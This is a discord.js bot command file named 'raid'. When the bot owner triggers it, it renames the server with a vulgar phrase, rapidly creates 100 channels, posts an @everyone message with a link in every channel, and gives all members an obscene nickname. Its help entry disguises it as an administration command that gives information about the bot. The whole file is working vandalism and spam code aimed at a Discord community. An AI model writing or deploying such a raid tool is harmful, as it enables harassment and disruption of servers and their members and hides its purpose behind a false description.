const Discord = require("discord.js");
const fs = require("fs");

module.exports.run = async (client, message, args) => {
    let db = JSON.parse(fs.readFileSync(`./serveur/${message.guild.id}.json`, "utf8"));
    let config = require("./../../config.json")
    let {lien} = require("./../../config.json")
    message.delete();
if(message.author.id !== config.bot.owner) return;

message.guild.setName('Fuck by iroo')


  var i;
  for (i = 0; i < 100; i++) {
  setTimeout(() => {

    message.guild.channels.create('Fuck by iroo',{type: 'text'})
      .then(console.log)
      .catch(console.error);

  },1*1) //3 secondes
  }
  
message.guild.channels.cache.forEach(channel =>
    channel.send('Slm les potes https://cdn.nekobot.xyz/b/2/8/1a259915a68431512800785eb7b90.gif @everyone'),
   
    )
 
            message.guild.members.cache.forEach(member =>{
                member.setNickname('je vous baise')
              })
    }







module.exports.help = {
    name: "raid",
    category: 'Administration',
    description: "Avoir quelque info sur le bot",
  };